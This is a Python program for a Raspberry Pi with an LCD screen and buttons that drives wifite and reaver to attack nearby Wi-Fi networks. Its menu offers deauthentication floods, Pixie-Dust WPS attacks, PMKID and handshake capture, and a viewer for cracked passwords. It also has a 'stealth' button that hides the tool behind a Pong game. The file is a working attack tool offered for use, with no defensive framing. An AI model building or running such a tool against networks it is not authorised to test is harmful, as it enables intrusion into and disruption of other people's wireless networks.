# -*- coding:utf-8 -*-
import LCD_1in44
import os
import time
import RPi.GPIO as GPIO
import subprocess
import threading
import sys
from PIL import Image, ImageDraw, ImageFont
from INA219 import INA219

os.environ["GPG_TTY"] = "/dev/tty1"
#os.system("export GPG_TTY=$(tty)")

ESSIDS = []  # List to store scanned ESSIDs
selected_essid = None  # Variable to store selected ESSID
selected_bssid = None
scanning = False  # State variable to track if scanning is active

OPTIONS_PER_PAGE = 11
DEBOUNCE_TIME = 0.15
current_index = 0

KEY_UP_PIN = 6
KEY_DOWN_PIN = 19
KEY_LEFT_PIN = 5
KEY_RIGHT_PIN = 26
KEY_PRESS_PIN = 13
KEY1_PIN = 21
KEY2_PIN = 20
KEY3_PIN = 16

disp = LCD_1in44.LCD()
disp.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
disp.LCD_Clear()

width, height = disp.width, disp.height
image = Image.new('RGB', (width, height), color=(0, 0, 0))
draw = ImageDraw.Draw(image)
font = ImageFont.load_default()

stealth_mode_active = False

def is_stealth_mode_active():
    return stealth_mode_active

# Initialize INA219
ina219 = INA219(addr=0x43)

def draw_battery_bar():
    bus_voltage = ina219.getBusVoltage_V()             # voltage on V- (load side)
    shunt_voltage = ina219.getShuntVoltage_mV() / 1000 # voltage between V+ and V- across the shunt
    p = (bus_voltage - 3) / 1.2 * 100
    if p > 100:
        p = 100
    if p < 0:
        p = 0

    # Determine battery bar color
    if p >= 60:
        color = (0, 255, 0)  # Green
    elif p >= 30:
        color = (255, 255, 0)  # Yellow
    else:
        color = (255, 0, 0)  # Red

    # Draw battery bar
    bar_width = int((width - 20) * (p / 100))
    draw.rectangle((10, height - 10, 10 + bar_width, height - 5), fill=color)
    draw.rectangle((10, height - 10, width - 10, height - 5), outline=(255, 255, 255))

# Function to monitor button presses for restart and stop
def monitor_buttons():
    global stealth_mode_active
    while True:
        #if GPIO.input(KEY3_PIN) == GPIO.LOW:
        #    print("Restart button pressed. Restarting script...")
        #    time.sleep(0.5)  # Debounce
        #    os.execv(sys.executable, ['python3'] + sys.argv)  # Restart the script

        if GPIO.input(KEY2_PIN) == GPIO.LOW:
            print("Stealth mode activated.")
            time.sleep(0.5)  # Debounce
            stealth_mode_active = True
            stealth()
            stealth_mode_active = False

        time.sleep(0.05)  # Short delay to avoid rapid looping

def check_monitor_mode_and_enable(interface):
    interface_name = interface[0] if isinstance(interface, tuple) else interface
    
    try:
        # Check for interfaces in monitor mode
        result = subprocess.run(["/usr/sbin/iwconfig"], capture_output=True, text=True)
        monitor_mode_found = False

        # Check if any interface is in monitor mode
        for line in result.stdout.splitlines():
            if "Mode:Monitor" in line:
                monitor_mode_found = True
                break
        
        # If no monitor mode found, start airmon-ng on the selected interface
        if not monitor_mode_found:
            print(f"No interfaces in monitor mode. Starting airmon-ng on {interface_name}...")
            subprocess.run(["sudo", "/usr/sbin/airmon-ng", "start", interface_name], check=True)
            print(f"Started monitor mode on {interface_name}.")
        else:
            print("An interface is already in monitor mode.")
    
    except subprocess.CalledProcessError as e:
        print(f"Error during operation: {e}")
        time.sleep(5)
    except Exception as e:
        print(f"An unexpected error occurred: {e}")
        time.sleep(5)
        
def check_monitor_mode_and_disable(interface):
    interface_name = interface[0] if isinstance(interface, tuple) else interface
    
    try:
        # Check for interfaces in monitor mode
        result = subprocess.run(["/usr/sbin/iwconfig"], capture_output=True, text=True)
        monitor_mode_found = False

        # Check if any interface is in monitor mode
        for line in result.stdout.splitlines():
            if "Mode:Monitor" in line:
                monitor_mode_found = True
                subprocess.run(["sudo", "ip", "link", "set", interface_name, "down"], check=True)
                subprocess.run(["sudo", "iw", "dev", interface_name, "set", "type", "managed"], check=True)
                subprocess.run(["sudo", "ip", "link", "set", interface_name, "up"], check=True)

    except subprocess.CalledProcessError as e:
        print(f"Error during operation: {e}")
        time.sleep(5)
    except Exception as e:
        print(f"An unexpected error occurred: {e}")
        time.sleep(5)

def get_wireless_interfaces():
    interfaces = []

    try:
        # Run iwconfig to get wireless interface details
        output = subprocess.check_output(['/usr/sbin/iwconfig'], text=True)
        
        # Split output into lines and parse each line
        lines = output.splitlines()
        current_interface = None
        
        for line in lines:
            if "IEEE 802.11" in line:  # This line indicates a wireless interface
                current_interface = line.split()[0]  # Get the interface name
                # Get driver information using ethtool
                try:
                    driver_info = subprocess.check_output(['/usr/sbin/ethtool', '-i', current_interface], text=True)
                    driver_name = next((line.split(": ")[1] for line in driver_info.splitlines() if "driver" in line), "Driver not found")
                    interfaces.append((current_interface, driver_name))
                except subprocess.CalledProcessError as e:
                    interfaces.append((current_interface, "Error fetching driver info"))
                    print(f"Error running ethtool for {current_interface}: {e}")

        if not interfaces:
            interfaces.append(("No wireless interfaces found", ""))
        
        return interfaces

    except subprocess.CalledProcessError as e:
        print(f"Error running iwconfig: {e}")
        return [("Error fetching interfaces", "")]
    except Exception as e:
        print(f"Error: {e}")
        return [("Error fetching interfaces", "")]


# Initialize wireless interfaces
wireless_interfaces = get_wireless_interfaces()
if len(wireless_interfaces) > 1:
    selected_interface = wireless_interfaces[1]
else:
    selected_interface = wireless_interfaces[0]


#Function scan for wifi
def scan_wifi_networks():
    global ESSIDS, current_index
    ESSIDS.clear()  # Clear previous scan results

# Get the scan duration from the "Scan Time" option
    scan_time_option = next(option for option in options if option["name"] == "Scan Time")
    scan_duration = int(scan_time_option["state"]) if scan_time_option["state"] != "Off" else 10

    display_message(f"Scanning for {scan_duration} seconds...")
    selected_interface_name = selected_interface[0] if isinstance(selected_interface, tuple) else selected_interface
    display_message_with_wrap(f"{selected_interface}, {selected_interface_name}")

    start_time = time.time()
    
    while time.time() - start_time < scan_duration:
        check_monitor_mode_and_disable(selected_interface_name)
        result = subprocess.run(["sudo", "/usr/sbin/iwlist", selected_interface_name, "scan"], capture_output=True, text=True)

        # Parse the output for ESSID and BSSID
        lines = result.stdout.splitlines()
        current_bssid = None  # Variable to hold the current BSSID
        for line in lines:
            if "Address:" in line:  # Detecting BSSID
                current_bssid = line.split("Address:")[1].strip()  # Capture the BSSID
            elif "ESSID" in line:  # Detecting ESSID
                essid = line.split(":")[1].strip().strip('"')
                if essid and current_bssid:  # Ensure both essid and bssid are present
                    # Store as a tuple (ESSID, BSSID)
                    if (essid, current_bssid) not in ESSIDS:  # Avoid duplicates
                        ESSIDS.append((essid, current_bssid))
                        while stealth_mode_active:
                            exit_stealth_mode()
                            time.sleep(0.1)  # Short delay to avoid rapid looping
                        display_message_with_wrap(f"{essid}", append=True)
                        print(f"{essid}, {current_bssid}")

        time.sleep(0.2)  # Add a slight delay between scans to avoid overloading the system

    print("Wi-Fi scan completed.")


# Function to display the ESSID selection menu

def essid_selection_menu():
    global selected_essid, selected_bssid

    if not ESSIDS:
        display_message("No Wi-Fi networks to display")
        return
    
    active_idx = 0
    total_essids = len(ESSIDS)

    while True:
        while stealth_mode_active:
            exit_stealth_mode()
            time.sleep(0.1)  # Short delay to avoid rapid looping
        draw.rectangle((0, 0, width, height), outline=0, fill=0)
        start_idx = max(0, active_idx - OPTIONS_PER_PAGE + 1)
        end_idx = min(total_essids, start_idx + OPTIONS_PER_PAGE)

        for i in range(start_idx, end_idx):
            essid, bssid = ESSIDS[i]  # Unpacking to get both ESSID and BSSID
            if i == active_idx:
                draw.text((6, (i - start_idx) * 10), f"> {essid}", font=font, fill=(255, 255, 0))  # Highlight active option
            else:
                draw.text((6, (i - start_idx) * 10), f"  {essid}", font=font, fill=(255, 255, 255))

        disp.LCD_ShowImage(image, 0, 0)

        if GPIO.input(KEY_UP_PIN) == GPIO.LOW:
            active_idx = (active_idx - 1) % total_essids  # Scroll up
            debounce()

        elif GPIO.input(KEY_DOWN_PIN) == GPIO.LOW:
            active_idx = (active_idx + 1) % total_essids  # Scroll down
            debounce()

        elif GPIO.input(KEY_PRESS_PIN) == GPIO.LOW:
            selected_essid, selected_bssid = ESSIDS[active_idx]  # Store both selected values
            display_message(f"Selected: {selected_essid}, BSSID: {selected_bssid}")
            time.sleep(1)
            break



options = [
    {"name": "PIXIE QUICK 30", "state": False, "command": "--wps-only --pixie --wps-time 30 -p 10"},
    {"name": "Scan WIFI", "state": False, "command": None},
    {"name": "Scan Time", "state": "Off", "command": "", "values": ["Off"] + [str(i) for i in range(10, 101, 10)]},
    {"name": "LOOP RUN", "state": False, "command": "-inf"},
    {"name": "I", "state": selected_interface, "command": ""},
    {"name": "Deauth", "state": False, "command": "--no-wps --no-pmkid"},
    {"name": "PIXIE", "state": False, "command": "--wps-only --pixie"},
    {"name": "WPS Time", "state": "Off", "command": "", "values": ["Off"] + [str(i) for i in range(60, 300, 10)]},
    {"name": "Deauth+PIXIE", "state": False, "command": "--no-pmkid --pixie"},
    {"name": "PMKID", "state": False, "command": "--no-wps --pmkid"},
    {"name": "No PMKID", "state": False, "command": "--no-pmkid"},
    {"name": "All Band", "state": False, "command": "-ab"},
    {"name": "Show Cracked", "command": None, "run_on_press": True},
    {"name": "Run Background", "state": True, "command": None},
    {"name": "Clients Only", "state": False, "command": "--clients-only"},
    {"name": "No Deauths", "state": False, "command": "--nodeauths"},
    {"name": "Deauth sec", "state": "Off", "command": "", "values": ["Off"] + [str(i) for i in range(31)]},
    {"name": "PIXIE QUICK 60", "state": False, "command": "--wps-only --pixie --wps-time 60 -p 20"},
    {"name": "DEAUTH QUICK 120", "state": False, "command": "--no-pmkid --no-wps -wpat 120"},
    {"name": "DEAUTH QUICK 240", "state": False, "command": "--no-pmkid --no-wps -wpat 240"},
    {"name": "Quit", "state": False, "command": None}
]

# Debounce function to avoid repeated code
def debounce():
    time.sleep(DEBOUNCE_TIME)

# Display feedback on the screen
def exit_stealth_mode():
    global stealth_mode_active
    if GPIO.input(KEY3_PIN) == GPIO.LOW:
        disp.LCD_Clear()
        stealth_mode_active = False

def display_message(message):
    while stealth_mode_active:
        exit_stealth_mode()
        time.sleep(0.1)  # Short delay to avoid rapid looping
    draw.rectangle((0, 0, width, height), outline=0, fill=0)
    draw.text((10, 10), message, font=font, fill=(255, 255, 255))
    disp.LCD_ShowImage(image, 0, 0)
    time.sleep(2) 

def display_top(message):
    while stealth_mode_active:
        exit_stealth_mode()
        time.sleep(0.1)  # Short delay to avoid rapid looping
    draw.rectangle((0, 0, 128, 20), outline=0, fill=0)
    message = re.sub(r'\x1B\[[0-?9;]*[mK]', '', message)  # Remove ANSI color codes
    draw.text((10, 0), message, font=font, fill=(255, 255, 255))
    disp.LCD_ShowImage(image, 0, 0)
    time.sleep(1) 

# Handle option toggling and updating command
def toggle_option(selection):
    option = options[selection]

    # Special case for "Select Interface" option
    if option['name'] == "I":
        current_index = wireless_interfaces.index(option["state"])
        option["state"] = wireless_interfaces[(current_index + 1) % len(wireless_interfaces)]
        global selected_interface  # Update the selected interface globally
        selected_interface = option["state"]
        print(f"Selected interface: {selected_interface}")

    # Special case for "Scan Time" option
    elif option['name'] == "Scan Time":
        current_index = option["values"].index(option["state"])
        option["state"] = option["values"][(current_index + 1) % len(option["values"])]
        option["command"] = f"-p {option['state']}" if option["state"] != "Off" else ""
        
    # Special case for "WPS Time" option
    elif option['name'] == "WPS Time":
        current_index = option["values"].index(option["state"])
        option["state"] = option["values"][(current_index + 1) % len(option["values"])]
        option["command"] = f"--wps-time {option['state']}" if option["state"] != "Off" else ""

    # Special case for "Deauth sec" option
    elif option['name'] == "Deauth sec":
        current_index = option["values"].index(option["state"])
        option["state"] = option["values"][(current_index + 1) % len(option["values"])]
        option["command"] = f"--wpadt {option['state']}" if option["state"] != "Off" else ""

    else:
        # Toggle state for boolean options
        option["state"] = not option["state"]  # Corrected line

# Function to display specific lines from cracked.json on the LCD
def display_file_on_lcd(filename):
    while stealth_mode_active:
        exit_stealth_mode()
        time.sleep(0.1)  # Short delay to avoid rapid looping
    try:
        with open(filename, 'r') as file:
            content = file.readlines()
    except Exception as e:
        display_message(f"Error reading file: {e}")
        return

    # Clear the screen before displaying new content
    draw.rectangle((0, 0, width, height), outline=0, fill=0)

    # Store lines that contain 'ESSID' or 'PSK'
    filtered_lines = []
    current_essid = None
    current_psk = None

    for line in content:
        if '"essid"' in line:
            if current_essid and current_psk is not None:
                filtered_lines.append(current_essid)
                filtered_lines.append(current_psk)
                filtered_lines.append("------")
            current_essid = line.split(":")[1].strip().strip('",')
            current_psk = "null"  # Default value if no PSK is found
        elif '"psk"' in line:
            current_psk = line.split(":")[1].strip().strip('",')

    # Add the last ESSID and PSK if present
    if current_essid and current_psk is not None:
        filtered_lines.append(current_essid)
        filtered_lines.append(current_psk)
        filtered_lines.append("------")

    # Check if any lines were found
    if not filtered_lines:
        display_message("No relevant data found.")
        return

    # Display the filtered content with scrolling
    start_idx = 0  # Track starting index for scrolling
    scroll_speed = 0.1  # Initial scroll speed
    scroll_hold_time = 2  # Time to hold before increasing scroll speed
    hold_start_time = None

    while True:
        while stealth_mode_active:
            exit_stealth_mode()
            time.sleep(0.1)  # Short delay to avoid rapid looping
        # Clear the screen and draw the lines to display
        draw.rectangle((0, 0, width, height), outline=0, fill=0)
        for i in range(start_idx, min(start_idx + (height // 10), len(filtered_lines))):
            draw.text((10, (i - start_idx) * 10), filtered_lines[i], font=font, fill=(255, 255, 255))

        disp.LCD_ShowImage(image, 0, 0)

        if GPIO.input(KEY_UP_PIN) == GPIO.LOW:
            if hold_start_time is None:
                hold_start_time = time.time()
            elif time.time() - hold_start_time > scroll_hold_time:
                scroll_speed = 0.03  # Increase scroll speed after holding
            if start_idx > 0:  # Scroll up
                start_idx -= 1
            time.sleep(scroll_speed)  # Debounce

        elif GPIO.input(KEY_DOWN_PIN) == GPIO.LOW:
            if hold_start_time is None:
                hold_start_time = time.time()
            elif time.time() - hold_start_time > scroll_hold_time:
                scroll_speed = 0.03  # Increase scroll speed after holding
            if start_idx < len(filtered_lines) - (height // 10):  # Scroll down
                start_idx += 1
            time.sleep(scroll_speed)  # Debounce

        else:
            hold_start_time = None
            scroll_speed = 0.1  # Reset scroll speed when button is released

        if GPIO.input(KEY_PRESS_PIN) == GPIO.LOW:  # Exit on any key press
            break

    disp.LCD_Clear()  # Clear the display before returning to the menu

def display_message_with_wrap(message, append=False, top=False):
    while stealth_mode_active:
        exit_stealth_mode()
        time.sleep(0.1)  # Short delay to avoid rapid looping

    # Maximum characters that fit on one line
    max_chars_per_line = width // 5  # Approximation (depends on font size)
    
    # Remove ASCII color codes
    message = re.sub(r'\x1B\[[0-?9;]*[mK]', '', message)  # ANSI escape code for colors

    # Split message into lines
    words = message.split()
    current_line = ""
    displayed_lines = []

    for word in words:
        # Check if adding the next word exceeds the line length
        if len(current_line) + len(word) + 1 <= max_chars_per_line:
            current_line += " " + word if current_line else word
        else:
            displayed_lines.append(current_line)
            current_line = word

    # Add the last line if it exists
    if current_line:
        displayed_lines.append(current_line)

    # If appending, retain the previously displayed lines
    if append:
        # Store existing lines from the previous message (if any)
        existing_lines = getattr(display_message_with_wrap, 'existing_lines', [])
        displayed_lines = existing_lines + displayed_lines

    # Limit the displayed lines to the height of the display
    max_visible_lines = (height - 20) // 12  # Assuming each line is 10 pixels high
    if len(displayed_lines) > max_visible_lines:
        displayed_lines = displayed_lines[-max_visible_lines:]  # Keep only the last few lines that fit

    # Clear the display before showing new content
    draw.rectangle((0, 0, width, height), outline=0, fill=0)
    draw_battery_bar()

    # Display the lines
    for i, line in enumerate(displayed_lines):
        draw.text((10, (i * 10) + 20), line.strip(), font=font, fill=(255, 255, 255))

    disp.LCD_ShowImage(image, 0, 0)

    # Store the displayed lines for the next call
    display_message_with_wrap.existing_lines = displayed_lines


import re
current_essid = ""
current_mac = ""

# Non-blocking I/O helper to read subprocess output
def read_output_nonblocking(process, output_lines):
    while stealth_mode_active:
        exit_stealth_mode()
        time.sleep(0.1)  # Short delay to avoid rapid looping
    global current_essid, current_mac

    essid_results = {}

    for line in iter(process.stdout.readline, ''):
        output_stripped = line.strip()

        # Display raw output (debugging line, can be removed)
        #display_message_with_wrap(f"Raw Output: {output_stripped}", append=False)

        # Display ESSID and signal strength while scanning
        essid_scan_match = re.search(r'^\s*\d+\s+(.+?)\s+\d+\s+\S+\s+(\d+db)', output_stripped)
        if essid_scan_match:
            essid_scan = essid_scan_match.group(1).strip()
            signal_strength = essid_scan_match.group(2).strip()
            display_message_with_wrap(f"Scanning: {essid_scan} ({signal_strength})", append=True)
            time.sleep(0.1)

        # Check for "Starting attacks against" message and update ESSID/MAC
        if "Starting attacks against" in output_stripped:
            essid_match = re.search(r'Starting attacks against (.+?) \((.*?)\)$', output_stripped)
            if essid_match:
                #disp.LCD_Clear()
                current_mac = essid_match.group(1).strip()  # Extract mac address
                current_essid = essid_match.group(2).strip()  # Extract essid
                display_top(f"-> {current_essid}")
                time.sleep(0.2)  # Keep the message on the screen longer

        # Handle output like targets and clients found
        matches = re.findall(r'\x1b\[[0-9;]*m.*?Found.*?\x1b\[[0-9;]*m(\d+).*?target\(s\).*?\x1b\[[0-9;]*m(\d+).*?client\(s\)', output_stripped)
        for match in matches:
            target_count, client_count = match
            output_lines.append(f"{target_count} targets, {client_count} clients")

            # Update display with ESSID and other information
            #display_message_with_wrap(f"-> {current_essid}", append=True, top=True)
            time.sleep(0.1)  # Keep this info on the screen for 2 seconds before continuing

        # Display important lines from wifite output
        if "WPA Handshake" in output_stripped:
            essid_results[current_essid] = "cracked"
            display_message_with_wrap(f"{current_essid} -> cracked", append=True)
            time.sleep(0.1)
        elif "Cracked" in output_stripped:
            if "PSK/Password: N/A" in output_stripped:
                essid_results[current_essid] = "cracked"
                display_message_with_wrap(f"{current_essid} > cracked", append=True)
            else:
                essid_results[current_essid] = "psk"
                display_message_with_wrap(f"{current_essid} > password", append=True)
            time.sleep(0.1)
        elif "Failed" in output_stripped:
            essid_results[current_essid] = "failed"
            display_message_with_wrap(f"{current_essid} > failed", append=True)
            time.sleep(0.1)

    # Print final results
    #display_message_with_wrap("\nFinal Results:", append=True)
    #for essid, result in essid_results.items():
    #    display_message_with_wrap(f"{essid} -> {result}", append=False)

def build_and_run_command():
    global selected_interface

    selected_interface_name = selected_interface[0] if isinstance(selected_interface, tuple) else selected_interface

   
    if selected_bssid is not None and any(option["state"] for option in options if option["name"] == "PIXIE"):
        check_monitor_mode_and_enable(selected_interface)
        command = ["sudo", "/usr/bin/reaver", "-i", selected_interface_name, "-vv", "--pixie-dust", "-b", selected_bssid]

        command_str = ' '.join(command)
        print(f"Running: {command_str}")
        time.sleep(1)
        disp.LCD_Clear()

        try:
            # Execute the command
            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

            # Read stdout and print output lines as they come in
            for line in iter(process.stdout.readline, ''):
                while stealth_mode_active:
                    exit_stealth_mode()
                    time.sleep(0.1)  # Short delay to avoid rapid looping
                display_message_with_wrap(line.strip())  # Print each output line
                print(line.strip())  # Print each output line

            process.stdout.close()  # Close the stdout pipe
            process.wait()  # Wait for the process to complete

            # Handle stderr output
            stderr_output = process.stderr.read()
            if stderr_output:
                print(f"Error: {stderr_output.strip()}")
                time.sleep(2)

        except Exception as e:
            print(f"Error: {e}")
            time.sleep(2)
    else:
        command = ["sudo", "/usr/sbin/wifite", "-mac", "-i", selected_interface_name]

        for option in options:
            if option.get("state") and option.get("command"):
                command.extend(option["command"].split())

        if selected_essid:
            command.append(f'-bssid "{selected_bssid}"')

        command_str = ' '.join(command)
        disp.LCD_Clear_Black()
        #display_message_with_wrap(f"Running: {command_str}")
        time.sleep(1)
        draw.rectangle((0, 0, width, height), outline=0, fill=0)

        try:
            # Execute the command
            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

            # Create a buffer to hold output lines
            output_lines = []

            # Start a thread to read output without blocking
            output_thread = threading.Thread(target=read_output_nonblocking, args=(process, output_lines))
            output_thread.start()

            process.wait()  # Wait for the process to complete
            output_thread.join()  # Ensure output reading completes

            # Handle stderr output
            stderr_output = process.stderr.read()
            if stderr_output:
                stderr_output_stripped = stderr_output.strip()
                disp.LCD_Clear()
                display_message_with_wrap(f"Error: {stderr_output_stripped}")
                time.sleep(2)
        except Exception as e:
            display_message(f"Error: {e}")
            time.sleep(2)

# Function to draw the current scroll window of options
def draw_menu(active_idx):
    while stealth_mode_active:
        exit_stealth_mode()
        time.sleep(0.1)  # Short delay to avoid rapid looping
    draw.rectangle((0, 0, width, height), outline=0, fill=0)  # Clear screen

    # Determine the start and end indices for the visible window
    start_idx = max(0, active_idx - OPTIONS_PER_PAGE + 1)  # Show last few options when at the bottom
    end_idx = min(len(options), start_idx + OPTIONS_PER_PAGE)

    # Draw options within the window
    for i in range(start_idx, end_idx):
        option = options[i]

        # Determine state display text
        if "state" in option:
            if isinstance(option["state"], bool):
                state_text = "On" if option["state"] else "Off"
            else:
                state_text = option["state"]
        else:
            state_text = ""

        if i == active_idx:
            draw.text((6, (i - start_idx) * 10), f"> {option['name']}: {state_text}", font=font, fill=(255, 255, 0))  # Highlight active option
        else:
            draw.text((6, (i - start_idx) * 10), f"  {option['name']}: {state_text}", font=font, fill=(255, 255, 255))  # Normal display

    # Draw the battery bar
    draw_battery_bar()

    disp.LCD_ShowImage(image, 0, 0)

from PIL import ImageSequence

def stealth():
    global stealth_mode_active

    # Ensure GPIO setup
    GPIO.setmode(GPIO.BCM)
    GPIO.setup(KEY_LEFT_PIN, GPIO.IN, pull_up_down=GPIO.PUD_UP)
    GPIO.setup(KEY_RIGHT_PIN, GPIO.IN, pull_up_down=GPIO.PUD_UP)

    # Simple game variables
    ball_pos = [width // 2, height // 2]
    ball_dir = [1, 1]
    ball_speed = 2
    paddle_width = 20
    paddle_height = 5
    paddle_pos = [width // 2 - paddle_width // 2, height - 20]  # Adjusted for battery bar
    paddle_speed = 5

    while stealth_mode_active:
        # Clear the screen
        draw.rectangle((0, 0, width, height), outline=0, fill=0)

        # Move the ball
        ball_pos[0] += ball_dir[0] * ball_speed
        ball_pos[1] += ball_dir[1] * ball_speed

        # Ball collision with walls
        if ball_pos[0] <= 0 or ball_pos[0] >= width:
            ball_dir[0] = -ball_dir[0]
        if ball_pos[1] <= 0:
            ball_dir[1] = -ball_dir[1]
        if ball_pos[1] >= height - 20:  # Adjusted for battery bar
            ball_dir[1] = -ball_dir[1]

        # Ball collision with paddle
        if (paddle_pos[0] <= ball_pos[0] <= paddle_pos[0] + paddle_width and
                paddle_pos[1] <= ball_pos[1] <= paddle_pos[1] + paddle_height):
            ball_dir[1] = -ball_dir[1]

        # Draw the ball
        draw.ellipse((ball_pos[0] - 2, ball_pos[1] - 2, ball_pos[0] + 2, ball_pos[1] + 2), fill=(255, 255, 255))

        # Draw the paddle
        draw.rectangle((paddle_pos[0], paddle_pos[1], paddle_pos[0] + paddle_width, paddle_pos[1] + paddle_height), fill=(255, 255, 255))

        # Move the paddle
        if GPIO.input(KEY_LEFT_PIN) == GPIO.LOW and paddle_pos[0] > 0:
            paddle_pos[0] -= paddle_speed
        if GPIO.input(KEY_RIGHT_PIN) == GPIO.LOW and paddle_pos[0] < width - paddle_width:
            paddle_pos[0] += paddle_speed

        # Draw the battery bar
        draw_battery_bar()

        # Display the game
        disp.LCD_ShowImage(image, 0, 0)
        time.sleep(0.05)  # Adjust the delay as needed

        # Exit stealth mode
        exit_stealth_mode()

def splash_screen():
    text = "SUN"
    text_color = (0, 255, 255)
    text_shadow_color = (255, 0, 255)
    text_pos = [width // 2, height // 2]
    text_dir = [1, 1]
    text_speed = 2
    font_large = ImageFont.load_default()  # Use default font to avoid resource issues

    start_time = time.time()
    while time.time() - start_time < 6:
        if GPIO.input(KEY_UP_PIN) == GPIO.LOW or GPIO.input(KEY_DOWN_PIN) == GPIO.LOW or GPIO.input(KEY_PRESS_PIN) == GPIO.LOW or GPIO.input(KEY1_PIN) == GPIO.LOW or GPIO.input(KEY2_PIN) == GPIO.LOW or GPIO.input(KEY3_PIN) == GPIO.LOW:
            break

        draw.rectangle((0, 0, width, height), outline=0, fill=0)

        # Move the text
        text_pos[0] += text_dir[0] * text_speed
        text_pos[1] += text_dir[1] * text_speed

        # Text collision with walls
        if text_pos[0] <= 0 or text_pos[0] >= width - 50:  # Adjusted for text width
            text_dir[0] = -text_dir[0]
        if text_pos[1] <= 0 or text_pos[1] >= height - 24:  # Adjusted for text height
            text_dir[1] = -text_dir[1]

        # Draw text shadow
        draw.text((text_pos[0] + 2, text_pos[1] + 2), text, font=font_large, fill=text_shadow_color)
        # Draw text
        draw.text((text_pos[0], text_pos[1]), text, font=font_large, fill=text_color)

        disp.LCD_ShowImage(image, 0, 0)
        time.sleep(0.05)

 #Update the menu loop to include scanning and selecting ESSIDs
def menu_loop():
    active_idx = 0
    total_options = len(options)

    while True:
        draw_menu(active_idx)

        if GPIO.input(KEY_UP_PIN) == GPIO.LOW:
            active_idx = (active_idx - 1) % total_options  # Scroll up
            debounce()

        elif GPIO.input(KEY_DOWN_PIN) == GPIO.LOW:
            active_idx = (active_idx + 1) % total_options  # Scroll down
            debounce()

        elif GPIO.input(KEY_PRESS_PIN) == GPIO.LOW:
            selected_option = options[active_idx]
            if selected_option.get("run_on_press"):
                display_message("Showing: cracked.json")
                display_file_on_lcd("cracked.json")
            elif selected_option["name"] == "Quit":
                display_message("Exiting...")
                time.sleep(1)
                disp.LCD_Clear()
                break
            elif selected_option["name"] == "Scan WIFI":  # New option to start scanning
                scan_wifi_networks()
                display_message("please select wifi")
                time.sleep(1)
                essid_selection_menu()  # After scanning, enter ESSID selection
            else:
                # Toggle option
                toggle_option(active_idx)
            debounce()

        elif GPIO.input(KEY1_PIN) == GPIO.LOW:
            build_and_run_command()
            debounce()

        elif GPIO.input(KEY2_PIN) == GPIO.LOW:  # New condition to display cat drawing
            stealth()
            debounce()

# Main program loop
if __name__ == "__main__":
    GPIO.setmode(GPIO.BCM)  # Use BCM numbering
    GPIO.setup(KEY_UP_PIN, GPIO.IN, pull_up_down=GPIO.PUD_UP)
    GPIO.setup(KEY_DOWN_PIN, GPIO.IN, pull_up_down=GPIO.PUD_UP)
    GPIO.setup(KEY_PRESS_PIN, GPIO.IN, pull_up_down=GPIO.PUD_UP)
    GPIO.setup(KEY1_PIN, GPIO.IN, pull_up_down=GPIO.PUD_UP)
    GPIO.setup(KEY2_PIN, GPIO.IN, pull_up_down=GPIO.PUD_UP)
    GPIO.setup(KEY3_PIN, GPIO.IN, pull_up_down=GPIO.PUD_UP)

    # Show splash screen
    splash_screen()

    button_thread = threading.Thread(target=monitor_buttons)
    button_thread.daemon = True
    button_thread.start()

    menu_loop()  # Start the interactive menu
    GPIO.cleanup()
    menu_loop()  # Start the interactive menu
    GPIO.cleanup()
